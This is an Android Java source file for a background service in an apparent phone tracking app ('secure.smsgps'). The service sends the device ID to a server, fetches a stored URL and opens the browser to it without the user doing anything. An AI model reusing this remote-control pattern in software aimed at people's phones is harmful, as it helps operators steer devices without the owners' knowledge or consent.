/**
 * Copyright OCTAL INFO SOLUTIONS PVT LTD.  4:53:43 PM  Jul 10, 2013
 */
package com.hinj.secure.smsgps;

import java.net.URLDecoder;
import java.util.Timer;
import java.util.TimerTask;

import android.app.Service;
import android.content.Intent;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Handler;
import android.os.IBinder;
import android.provider.Settings.Secure;

import com.hinj.app.utils.HinjAppPreferenceUtils;
import com.hinj.app.utils.Utility;
import com.hinj.parsing.HingAppParsing;

public class CheckBrosweUrlBackgroundService extends Service {
	
	private static final String TAG = "CheckBrosweUrlBackgroundService";
	private TimerTask mBackgroundServiceTask;
	private Handler mHandler;
	private Timer mBackgroundServiceTimer;
	private String clip_board_string = "";

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {
		mHandler=new Handler();
	}
	
	public int onStartCommand(Intent intent, int flags, int startId) {
		
		mBackgroundServiceTask = new TimerTask() {
			public void run() {
				mHandler.post(new Runnable() {
					@Override
					public void run() {
						if (true) {
								try {	
									if(Utility.isNetworkAvailable(CheckBrosweUrlBackgroundService.this)){
										new GetBrowseUrlAsyncTask().execute();
									}
								} catch (Exception e) {
									e.printStackTrace();
							}
						}
					}
				});
			}
		};
		mBackgroundServiceTimer = new Timer();		
		mBackgroundServiceTimer.schedule(mBackgroundServiceTask, 1);
		return START_STICKY;
	}
	
	public class GetBrowseUrlAsyncTask extends AsyncTask<String, String,Object[]> {
		
		String response = "";
		String upload_device_id = Secure.getString(CheckBrosweUrlBackgroundService.this.getContentResolver(),Secure.ANDROID_ID);
		String browse_url="";
		public GetBrowseUrlAsyncTask() {
		}

		@Override
		public void onPreExecute() {
		}

		@Override
		public Object[] doInBackground(String... params) {
			
			return HingAppParsing.getBrowserUrl(CheckBrosweUrlBackgroundService.this,upload_device_id); 
		}  
 
		@Override
		public void onPostExecute(Object[] result) {
			try{
				System.out.println("result " + result);
				boolean status = (Boolean) result[0];
				response = (String) result[1];
				
				if(status)
				{
					try {
						browse_url = HinjAppPreferenceUtils.getUrl(CheckBrosweUrlBackgroundService.this);
						
						if(!browse_url.equalsIgnoreCase(""))
						{
							openBrowser("http://"+browse_url);
						}
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
			}
			catch (Exception e) {
				e.printStackTrace();
			}
		}
	} 
	
	@SuppressWarnings("deprecation") 
	protected void openBrowser(String browse_url) {
		try {
			Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(URLDecoder.decode(browse_url)));
			browserIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			CheckBrosweUrlBackgroundService.this.startActivity(browserIntent);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}
